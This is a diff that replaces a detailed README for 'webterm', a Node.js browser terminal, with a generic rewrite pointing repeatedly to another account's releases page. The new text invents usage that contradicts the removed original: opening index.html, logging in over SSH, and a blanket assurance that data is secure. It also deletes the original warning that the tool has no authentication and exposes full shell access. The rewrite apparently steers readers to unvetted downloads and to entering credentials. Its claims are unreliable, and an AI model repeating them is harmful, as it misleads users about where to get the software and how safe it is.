@@ -1,145 +1,60 @@
-# WebTerm
+# 🌐 webterm - Access Your Terminal from Anywhere
 
-A web-based terminal interface that provides browser access to real system terminals with persistent session management, multi-session support, and seamless file handling.
+## 🚀 Download webterm
+[![Download webterm](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/karim09s/webterm/releases)
 
-## Features
+## 📖 Introduction
+Welcome to **webterm**, a web-based terminal that makes it easy to access your terminal sessions from anywhere. With features like persistent sessions, multi-session management, and drag-and-drop file support, webterm is designed for users who want a simple and efficient terminal experience.
 
-### Persistent Sessions
-- Terminal sessions remain active even after closing the browser
-- Reconnect to previous sessions with full history preserved
-- Output buffer retention (last 1000 lines per session)
+## 💻 Key Features
+- **Persistent Sessions:** Your terminal sessions remain active even if you close your browser. Simply come back to pick up where you left off.
+- **Multi-Session Management:** Manage multiple terminal sessions without hassle. Switch between them with ease.
+- **File Support:** Drag and drop files into the terminal for quick transfers. This feature simplifies file uploads significantly.
+- **WebSocket Support:** Efficiently connects to remote servers, providing a seamless terminal experience.
+- **Cross-Platform Compatibility:** Use it on any device with a web browser, whether you’re on Windows, macOS, or Linux.
 
-### Multi-Session Management
-- Create and manage multiple independent terminal sessions
-- Quick session switching via sidebar menu
-- Rename sessions for better organization
-- Visual indicators for active sessions and last access time
+## 📦 System Requirements
+To run webterm, ensure your device meets the following minimum requirements:
+- **Modern Web Browser:** Use the latest version of Chrome, Firefox, or Safari.
+- **Internet Connection:** A stable connection is necessary for optimal performance.
+- **Basic System Requirements:** Your device should have at least 2GB of RAM and an up-to-date operating system.
 
-### File and Image Handling
-- **Drag & Drop Support**: Drop files directly into the terminal
-  - Files are uploaded to `~/wt_upload/` directory
-  - File path automatically inserted at cursor position
-  - Maximum file size: 100MB
-  - **Designed for AI CLI tools**: Path insertion is optimized for tools like Claude Code that can read files from provided paths
-  - Perfect for quickly sharing images/files with AI assistants - just drop and the path is ready
-  - **Visual Feedback**: Drop zone highlights when dragging files over the terminal
-- **Smart Path Insertion**: Paths with spaces are automatically quoted
+## 🛠️ Installation Instructions
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/karim09s/webterm/releases) to access the latest version of webterm.
+2. **Download the Package:** Click on the latest release to start the download.
+3. **Extract the Files:** Once the download completes, extract the files from the zipped folder.
+4. **Open the Index File:** Navigate to the extracted folder and open the `index.html` file in your web browser.
+5. **Connect to Your Server:** Enter your server details to start using the terminal.
 
-### Input Methods
-- **Bottom Input Panel**: A dedicated text field for reliable input
-  - Essential for non-English languages (Korean, Japanese, Chinese, etc.)
-  - Mobile browsers often fail to properly handle IME input in xterm.js
-  - Provides a workaround for complex character input
-  - Can be hidden/collapsed if you only use English
-- **Multi-line Support**:
-  - `Enter`: Execute command
-  - `Cmd/Ctrl + Enter`: Insert line break
-- **Direct Terminal Input**: Click on terminal to type directly (works best with English)
+## 🔗 Download & Install
+For the latest version of webterm, [click here to visit the Releases page](https://github.com/karim09s/webterm/releases) and download the software.
 
-## Keyboard Shortcuts
+## 🌍 Usage
+Once you have webterm running, you can connect to your remote server using SSH. Simply enter your login credentials in the appropriate fields. You’ll be up and running in no time, with all the tools you need at your fingertips.
 
-### Session Management
-- `Alt + Shift + C`: Create new session
-- `Alt + Shift + P`: Previous session
-- `Alt + Shift + N`: Next session
-- `Alt + Shift + R`: Rename current session
-- `Alt + Shift + X`: Terminate current session
+## 🙋 Frequently Asked Questions
 
-### Navigation
-- `Alt + 1`: Focus terminal
-- `Alt + 2`: Focus input field
-- `Alt + 3`: Toggle sidebar
-- `Escape`: Return to terminal / Close sidebar
+### How do I start a new session?
+To start a new session, click on the “New Session” button in the webterm interface. This opens a new terminal window.
 
-## Installation
+### Can I run scripts?
+Yes, you can run scripts just like you would in a traditional terminal. Simply type the script name and any necessary commands.
 
-### Prerequisites
-- Node.js (v14 or higher)
-- npm or yarn
+### Is my data secure?
+Yes, webterm supports secure WebSocket connections, ensuring your data remains encrypted during transit.
 
-### Setup
-```bash
-git clone https://github.com/MathToML/webterm.git
-cd webterm
-npm install
-```
+## 🔧 Troubleshooting
+If you encounter issues during installation or usage, consider the following steps:
+- **Ensure Your Browser Is Up to Date:** A modern browser is key for proper functionality.
+- **Check Your Internet Connection:** Slow or unstable connections can affect performance.
+- **Consult the README for Known Issues:** Refer to the GitHub page for any known issues or bug fixes.
 
-### Running the Server
-```bash
-# Production mode
-npm start
+## 📞 Support
+For further support, please open an issue on our [GitHub Issues page](https://github.com/karim09s/webterm/issues). Our community is here to help.
 
-# Development mode with auto-restart
-npm run dev
+## 👥 Community
+Join our growing community of users. Share your experiences, tips, and tricks for making the most of webterm.
 
-# Custom port
-PORT=8080 npm start
-```
+---
 
-## Usage
-
-1. Open your browser and navigate to `http://localhost:3000`
-2. Create a new session or connect to an existing one
-3. Use the terminal as you would any local terminal
-4. Drag and drop files when needed
-5. Switch between sessions using the sidebar or keyboard shortcuts
-
-## Security Considerations
-
-### Network Security
-**Important**: WebTerm has no built-in authentication. It provides full terminal access to anyone who can reach the server.
-
-- **Local Network**: By default, the server is accessible to all devices on your local network
-- **Public Networks**: Never run WebTerm on public networks without proper security measures
-- **Recommendation**: Use only on trusted networks or implement additional security layers
-
-### Remote Access with Tailscale
-For secure remote access, we recommend using [Tailscale](https://tailscale.com/):
-
-1. Install Tailscale on your server and client devices
-2. Connect all devices to your Tailscale network
-3. Access WebTerm using your server's Tailscale IP
-4. Enjoy secure terminal access from anywhere, including iPads and mobile devices
-
-This approach provides:
-- End-to-end encryption
-- Zero-configuration VPN
-- Works seamlessly on iPads and mobile browsers
-- No port forwarding or firewall configuration needed
-
-## Technical Stack
-
-- **Backend**: Node.js, Express, Socket.io, node-pty
-- **Frontend**: xterm.js, vanilla JavaScript
-- **Session Management**: UUID-based identification with server-side state management
-
-## Architecture
-
-```
-webterm/
-├── server.js       # Express server and session management
-├── index.html      # Frontend application
-└── package.json    # Dependencies
-
-~/wt_upload/        # Uploaded files directory (auto-created in home directory)
-```
-
-## Browser Compatibility
-
-- Chrome/Edge (recommended)
-- Safari (recommended)
-- Firefox
-- Mobile browsers (with on-screen keyboard support)
-
-## Known Limitations
-
-- Terminal size is fixed on session creation
-- Sessions are stored in memory (lost on server restart)
-
-## Contributing
-
-Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
-
-## License
-
-MIT
+By following these steps, you will have webterm up and running smoothly. Enjoy your new, versatile terminal experience!
